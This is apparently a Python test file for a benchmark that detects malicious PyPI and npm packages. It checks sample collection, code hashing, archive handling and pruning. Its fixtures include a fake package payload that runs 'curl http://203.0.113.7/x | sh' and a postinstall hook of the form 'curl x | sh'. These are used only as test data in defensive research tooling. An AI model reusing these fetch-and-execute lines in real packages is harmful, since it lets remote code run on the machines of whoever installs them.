"""평가 규칙 v2 수집 · 색인 점검(네트워크 없이) — python3 -B -m unittest discover -s bench/v2 -p 'test_*.py'"""
import datetime as dt
import io
import json
import os
import sys
import tarfile
import tempfile
import unittest
import zipfile

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import collect  # noqa: E402
import sample  # noqa: E402
import split  # noqa: E402


def zip_bytes(files):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, data in files.items():
            zf.writestr(name, data)
    return buf.getvalue()


def tar_bytes(files, mode="w:gz"):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode=mode) as tf:
        for name, data in files.items():
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def row_of(files, name="evil-pkg", version="1.0.3", **kw):
    args = dict(ecosystem="pypi", label="malicious", name=name, version=version, date="2025-01-01", source="t", form="zip")
    return sample.build_row(zip_bytes(files), **{**args, **kw})


PAYLOAD = b"import os\nos.system('curl http://203.0.113.7/x | sh')\n" * 8


class Hashing(unittest.TestCase):
    def test_same_code_under_another_name_and_version_hashes_the_same(self):
        a = row_of({"evil-pkg-1.0.3/setup.py": b"setup(name='evil-pkg', version='1.0.3')\n" + PAYLOAD}, "evil-pkg", "1.0.3")
        b = row_of({"Evil_Pkg2-2.0.0/setup.py": b"setup(name='Evil_Pkg2', version='2.0.0')\n" + PAYLOAD}, "Evil_Pkg2", "2.0.0")
        c = row_of({"other-9.9.9/setup.py": b"setup(name='other', version='9.9.9')\nprint('hi')\n"}, "other", "9.9.9")
        self.assertEqual(a["codeFiles"], b["codeFiles"])
        self.assertEqual(split.fingerprint(a), split.fingerprint(b))
        self.assertNotEqual(split.fingerprint(a), split.fingerprint(c))
        self.assertNotEqual(a["id"], b["id"])  # 파일은 다르다

    def test_line_endings_and_trailing_space_do_not_matter(self):
        a = row_of({"p/a.py": b"x = 1\ny = 2\n"})
        b = row_of({"p/a.py": b"x = 1  \r\ny = 2\r\n"})
        self.assertEqual(a["codeFiles"], b["codeFiles"])

    def test_short_names_and_versions_are_not_masked(self):
        self.assertEqual(sample.mask("import os; a = 1", "os", "1"), "import os; a = 1")
        self.assertEqual(sample.mask("require('@acme/left_pad') // left-pad 1.2.3", "@acme/left-pad", "1.2.3"),
                         "require('<NAME>') // <NAME> <VERSION>")

    def test_only_code_files_count_and_meta_package_json_are_left_out(self):
        r = row_of({
            "tmp/x/pkg/index.js": b"// comment\n\nconst a = 1\nrequire('child_process')\n",
            "tmp/x/pkg/package.json": json.dumps({"name": "evil-pkg", "scripts": {"preinstall": "node index.js", "test": "jest", "install": " "}}).encode(),
            "tmp/x/package_info-evil-pkg-1.0.3.json": b'{"name": "evil-pkg"}',
            "tmp/x/pkg/package_info.py": b"x = 1\n",
            "tmp/x/pkg/README.md": b"# hi\n",
            "tmp/x/pkg/blob.js": b"\xff\xfe\x00not utf8",
            "tmp/x/pkg/empty.py": b"",
        }, form="zip")
        self.assertEqual(r["files"], 7)
        self.assertEqual(len(r["codeFiles"]), 2)                      # index.js · empty.py
        self.assertEqual(sorted(f["bytes"] for f in r["codeFiles"]), [0, len("// comment\n\nconst a = 1\nrequire('child_process')\n")])
        self.assertEqual(r["codeLines"], 2 + 1)                       # 코드 2줄 + preinstall 1(빈 install · test 는 세지 않는다)
        self.assertNotIn("indexError", r)

    def test_install_script_alone_makes_a_sample_analyzable(self):
        r = row_of({"package/package.json": json.dumps({"scripts": {"postinstall": "curl x | sh"}}).encode(),
                    "package/node_modules/dep/package.json": json.dumps({"scripts": {"install": "a", "prepare": "b"}}).encode()})
        self.assertEqual((r["codeFiles"], r["codeLines"]), ([], 1))  # 가장 얕은 package.json 만

    def test_big_code_file_is_not_a_code_file(self):
        r = row_of({"p/big.js": b"a\n" * (sample.MAX_CODE_BYTES // 2 + 1), "p/ok.js": b"a\n"})
        self.assertEqual(len(r["codeFiles"]), 1)


class Archives(unittest.TestCase):
    FILES = {"pkg-1.0/setup.py": b"print(1)\n", "pkg-1.0/pkg/__init__.py": b"x = 2\n"}

    def test_zip_tar_gz_and_tar_bz2_read_the_same(self):
        rows = [sample.build_row(data, ecosystem="pypi", label="benign", name="pkg", version="1.0", date="", source="t", form=form)
                for data, form in ((zip_bytes(self.FILES), "wheel"), (tar_bytes(self.FILES), "sdist"), (tar_bytes(self.FILES, "w:bz2"), "sdist"))]
        self.assertEqual(rows[0]["codeFiles"], rows[1]["codeFiles"])
        self.assertEqual(rows[1]["codeFiles"], rows[2]["codeFiles"])
        self.assertEqual({r["codeLines"] for r in rows}, {2})
        self.assertEqual(len({r["id"] for r in rows}), 3)

    def test_unreadable_sample_is_kept_as_no_code_with_a_reason(self):
        r = sample.build_row(b"PK\x03\x04 not really a zip", ecosystem="npm", label="malicious", name="x", version="", date="", source="t", form="zip")
        self.assertEqual((r["codeFiles"], r["codeLines"], r["indexError"]), ([], 0, "압축을 읽지 못함"))
        self.assertEqual(r["id"], sample.sample_id(b"PK\x03\x04 not really a zip"))

    def test_paths_are_normalized_and_nested_archives_stay_closed(self):
        inner = zip_bytes({"hidden.py": b"x = 1\n"})
        files, err = sample.members(zip_bytes({"../../etc/a.py": b"a = 1\n", "pkg/inner.zip": inner}))
        self.assertIsNone(err)
        self.assertEqual([n for n, _ in files], ["etc/a.py", "pkg/inner.zip"])
        r = sample.build_row(zip_bytes({"pkg/inner.zip": inner}), ecosystem="pypi", label="benign", name="pkg", version="", date="", source="t", form="sdist")
        self.assertEqual(r["codeFiles"], [])

    def test_too_many_bytes_is_refused_before_reading(self):
        old = sample.MAX_EXTRACT
        sample.MAX_EXTRACT = 10
        try:
            self.assertEqual(sample.members(zip_bytes({"a.py": b"x" * 11})), (None, "풀면 크기 상한 초과"))
            self.assertEqual(sample.members(tar_bytes({"a.py": b"x" * 11})), (None, "풀면 크기 상한 초과"))
        finally:
            sample.MAX_EXTRACT = old


class Rules(unittest.TestCase):
    def test_protocol_matches_code(self):
        with open(split.PROTOCOL, encoding="utf-8") as f:
            p = json.load(f)
        unit, mal, ben = p["unit"], p["data"]["malicious"], p["data"]["benign"]
        for ext in sample.CODE_EXT:
            self.assertIn(ext + " ", unit["codeFiles"])
        self.assertIn(f"{sample.MAX_CODE_BYTES >> 20}MB 이하", unit["codeFiles"])
        self.assertIn(f"{sample.MIN_MASK_NAME}자", unit["codeFiles"])
        for k in sample.INSTALL_SCRIPTS:
            self.assertIn(k, unit["codeLines"])
        self.assertIn(f"{collect.NPM_KEEP:,}", mal["npm"])
        self.assertIn(f"{collect.NPM_SCAN_MAX:,}", mal["npm"])
        self.assertIn(f"{collect.LONGTAIL_MIN_AGE_DAYS}일", ben["longTail"])
        self.assertIn(f"{collect.MAX_BENIGN_BYTES >> 20}MB", ben["size"])

    def test_datadog_paths(self):
        self.assertEqual(collect.parse_datadog_path("samples/pypi/malicious_intent/numoy/2022-11-17-numoy.zip"),
                         {"ecosystem": "pypi", "kind": "malicious_intent", "name": "numoy", "version": "", "date": "2022-11-17",
                          "path": "samples/pypi/malicious_intent/numoy/2022-11-17-numoy.zip"})
        e = collect.parse_datadog_path("samples/npm/compromised_lib/@ctrl@ngx-csv/6.0.2/2025-09-15-@ctrl_ngx-csv-v6.0.2.zip")
        self.assertEqual((e["name"], e["version"], e["date"], e["kind"]), ("@ctrl/ngx-csv", "6.0.2", "2025-09-15", "compromised_lib"))
        self.assertIsNone(collect.parse_datadog_path("samples/npm/manifest.json"))
        self.assertIsNone(collect.parse_datadog_path("samples/npm/a/b/c/d/e.zip"))

    def test_latest_per_name_and_hash_order(self):
        mk = lambda name, date, path: {"name": name, "date": date, "path": path}  # noqa: E731
        got = collect.latest_per_name([mk("a", "2025-01-01", "p1"), mk("a", "2025-03-01", "p2"), mk("a", "2025-03-01", "p3"), mk("b", "2024-01-01", "p4")])
        self.assertEqual({k: v["path"] for k, v in got.items()}, {"a": "p3", "b": "p4"})
        names = [f"pkg-{i}" for i in range(50)]
        order = collect.hash_order(1, "npm", names)
        self.assertEqual(order, collect.hash_order(1, "npm", reversed(names)))
        self.assertNotEqual(order, collect.hash_order(2, "npm", names))
        self.assertNotEqual(order, collect.hash_order(1, "pypi", names))
        self.assertNotEqual(order, sorted(names))

    def test_pypi_file_choice(self):
        f = lambda name, kind, size=10, yanked=False: {"filename": name, "packagetype": kind, "size": size, "yanked": yanked,  # noqa: E731
                                                        "url": "u/" + name, "upload_time_iso_8601": "2024-05-06T01:02:03Z"}
        got, why = collect.pick_pypi_file([f("b-1.0-py3-none-any.whl", "bdist_wheel"), f("b-1.0.tar.gz", "sdist")])
        self.assertEqual((got["form"], got["filename"], got["date"], why), ("sdist", "b-1.0.tar.gz", "2024-05-06", None))
        got, _ = collect.pick_pypi_file([f("b-1.0-cp313-win32.whl", "bdist_wheel"), f("b-1.0-cp312-macos.whl", "bdist_wheel")])
        self.assertEqual((got["form"], got["filename"]), ("wheel", "b-1.0-cp312-macos.whl"))
        self.assertEqual(collect.pick_pypi_file([f("b-1.0.tar.gz", "sdist", yanked=True)]), (None, "받을 파일 없음"))
        self.assertEqual(collect.pick_pypi_file([f("b-1.0.tar.gz", "sdist", size=collect.MAX_BENIGN_BYTES + 1)]), (None, "50MB 초과"))

    def test_longtail_conditions(self):
        day = dt.date(2026, 11, 12)
        ok = dict(popular=False, has_malware_advisory=False)
        self.assertIsNone(collect.longtail_reject("2025-11-12T00:00:00Z", day, **ok))            # 정확히 365일
        self.assertEqual(collect.longtail_reject("2025-11-13", day, **ok), "첫 출시 1년 미만")
        self.assertEqual(collect.longtail_reject("", day, **ok), "출시 기록 없음")
        self.assertEqual(collect.longtail_reject("2020-01-01", day, popular=True, has_malware_advisory=False), "인기 묶음")
        self.assertEqual(collect.longtail_reject("2020-01-01", day, popular=False, has_malware_advisory=True), "MAL- 권고 있음")
        self.assertEqual(collect.longtail_reject("2020-01-01", day, placeholder=True, **ok), "보안 자리표시 패키지")

    def test_benign_quota_matches_malicious_count(self):
        self.assertEqual(collect.benign_quota(2001), {"popular": 1001, "longTail": 1000})
        self.assertEqual(sum(collect.benign_quota(1832).values()), 1832)

    def test_journal_resumes(self):
        with tempfile.TemporaryDirectory() as d:
            path = os.path.join(d, "meta", "step.jsonl")
            j = collect.Journal(path)
            j.add("a", status="kept", row={"id": "1"})
            j.add("b", status="skip", why="없음")
            again = collect.Journal(path)
            self.assertTrue("a" in again and "b" in again and "c" not in again)
            self.assertEqual(again.kept(), [{"id": "1"}])


class Prune(unittest.TestCase):
    """쓰지 않는 표본 · 사본 정리 — 임시 폴더에서."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        d = self.tmp.name
        self.saved = {k: getattr(collect, k) for k in ("DATA", "STORE", "SEALED_DIR", "CACHE", "REPO", "INDEX")}
        self.saved_split = split.SPLIT
        collect.DATA, collect.STORE, collect.SEALED_DIR = d, os.path.join(d, "store"), os.path.join(d, "sealed")
        collect.CACHE, collect.REPO, collect.INDEX = os.path.join(d, "cache"), os.path.join(d, "datadog-repo"), os.path.join(d, "index.jsonl")
        split.SPLIT = os.path.join(d, "split.json")
        self.addCleanup(self.restore)
        for sub in ("store", "sealed/test", "cache", "datadog-repo/.git/objects/pack"):
            os.makedirs(os.path.join(d, sub))
        self.put("store/aaaa.zip", "store/dupe.zip", "store/half.zip.part", "sealed/test/bbbb.tgz", "cache/names.json",
                 "datadog-repo/.git/objects/pack/pack-1.pack", "datadog-repo/.git/objects/pack/pack-1.idx",
                 "datadog-repo/.git/objects/pack/pack-2.pack", "datadog-repo/.git/objects/pack/pack-2.promisor")
        with open(collect.INDEX, "w") as f:
            for i, form in (("aaaa", "zip"), ("bbbb", "tarball"), ("dupe", "zip")):
                f.write(json.dumps({"id": i, "form": form}) + "\n")
        with open(split.SPLIT, "w") as f:
            json.dump({"assignments": {"aaaa": "train", "bbbb": "test"}, "sealed": ["test", "reserve"]}, f)

    def restore(self):
        for k, v in self.saved.items():
            setattr(collect, k, v)
        split.SPLIT = self.saved_split

    def put(self, *names):
        for n in names:
            with open(os.path.join(self.tmp.name, n), "wb") as f:
                f.write(b"x" * 10)

    def has(self, name):
        return os.path.exists(os.path.join(self.tmp.name, name))

    def test_fetched_packs_are_dropped_and_the_rest_of_the_clone_stays(self):
        self.assertEqual(collect._packs(), {"pack-1", "pack-2"})
        collect.drop_packs({"pack-2"})
        self.assertEqual(collect._packs(), {"pack-1"})
        self.assertFalse(self.has("datadog-repo/.git/objects/pack/pack-2.promisor"))
        self.assertTrue(self.has("datadog-repo/.git/objects/pack/pack-1.idx"))

    def test_prune_removes_only_what_the_split_does_not_use(self):
        collect.cmd_prune(None)
        self.assertTrue(self.has("store/aaaa.zip") and self.has("sealed/test/bbbb.tgz"))   # 분할에 든 표본은 그대로
        for gone in ("store/dupe.zip", "store/half.zip.part", "cache", "datadog-repo"):
            self.assertFalse(self.has(gone), gone)
        self.assertTrue(self.has("index.jsonl"))

    def test_prune_refuses_when_an_assigned_sample_is_missing(self):
        os.remove(os.path.join(self.tmp.name, "store/aaaa.zip"))
        with self.assertRaisesRegex(collect.Stop, "아무것도 지우지 않았다"):
            collect.cmd_prune(None)
        self.assertTrue(self.has("store/dupe.zip") and self.has("cache/names.json") and self.has("datadog-repo"))


if __name__ == "__main__":
    unittest.main()
